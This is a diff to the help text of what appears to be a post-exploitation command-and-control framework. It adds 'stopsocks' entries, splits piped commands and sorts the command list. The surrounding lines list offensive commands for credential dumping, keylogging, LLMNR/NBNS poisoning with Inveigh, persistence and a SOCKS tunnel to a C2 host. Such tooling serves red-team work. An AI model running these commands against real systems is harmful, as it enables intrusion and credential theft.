@@ -225,6 +225,7 @@ stopdaisy
 * Socks:
 =========
 sharpsocks
+stopsocks
 run-exe SharpSocksImplantTestApp.Program SharpSocks -url1 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -url2 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -c raFAdgVujTHBwcvMuRFYgKHqp -k fFaKiMspoTWHPbu3PvUNvpzTkuq+VKDp+h1X79q3gXQ= -s https://10.10.10.1 -b 5000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken
 
 * Bloodhound:
@@ -372,7 +373,7 @@ get-netcomputer -searchbase "LDAP://OU=Windows 2008 Servers,OU=ALL Servers,DC=po
 get-netcomputer -domaincontroller internal.domain.com -domain internal.domain.com -Filter "(lastlogontimestamp>=$((Get-Date).AddDays(-30).ToFileTime()))(samaccountname=UK*)"|select name,lastlogontimestamp,operatingsystem
 get-domaincomputer -ldapfilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -spn "wsman*" -properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl
 get-netgroup | select-string -pattern "internet"
-get-netuser -filter | select-object samaccountname,userprincipalname
+get-netuser | select-object samaccountname,userprincipalname
 get-netuser -filter samaccountname=test
 get-netuser -filter userprinciplename=test@test.com
 get-netgroup | select samaccountname
@@ -412,7 +413,8 @@ get-passpol
 get-passnotexp
 get-locadm
 invoke-inveigh -http y -proxy y -nbns y -tool 1 -StartupChecks y
-get-inveigh | stop-inveigh (gets output from inveigh thread)
+get-inveigh
+stop-inveigh
 invoke-sniffer -outputfile c:\\temp\\output.txt -maxsize 50mb -localip 10.10.10.10
 invoke-sqlquery -sqlserver 10.0.0.1 -user sa -pass sa -query 'select @@version'
 invoke-runas -user <user> -password '<pass>' -domain <dom> -command c:\\windows\\system32\\cmd.exe -args " /c calc.exe"
@@ -463,7 +465,8 @@ get-recentfiles
 cred-popper
 get-clipboard
 hashdump
-get-keystrokes | get-keystrokedata
+get-keystrokes
+get-keystrokedata
 arpscan -ipcidr 10.0.0.1/24
 portscan -hosts 10.0.0.1-50 -ports "1-65535" -threads 10000 -delay 0
 get-netstat | %{"$($_.Protocol) $($_.LocalAddress):$($_.LocalPort) $($_.RemoteAddress):$($_.RemotePort) $($_.State) $($_.ProcessName)($($_.PID))"}
@@ -477,6 +480,7 @@ get-injectedthread
 get-eventlog -newest 10000 -instanceid 4624 -logname security | select message -expandproperty message | select-string -pattern "user1|user2|user3"
 send-mailmessage -to "itdept@test.com" -from "user01 <user01@example.com>" -subject <> -smtpserver <> -attachment <>
 sharpsocks -uri http://www.c2.com:9090 -beacon 2000 -insecure
+stopsocks
 netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow program="C:\\windows\\system32\\svchost.exe" protocol=TCP localport=80 profile=Domain
 reversedns 10.0.0.1
 invoke-edrchecker
@@ -516,7 +520,6 @@ add-autorun <task>
 list-autorun (alias: l)
 del-autorun <taskid>
 nuke-autorun
-automigrate-frompowershell (alias: am)
 
 * Hosted-Files:
 ====================
@@ -575,6 +578,7 @@ def build_help(help_string):
         except Exception:
             print_bad("Error building help")
             traceback.print_exc()
+    commands.sort()
     return commands
 
 
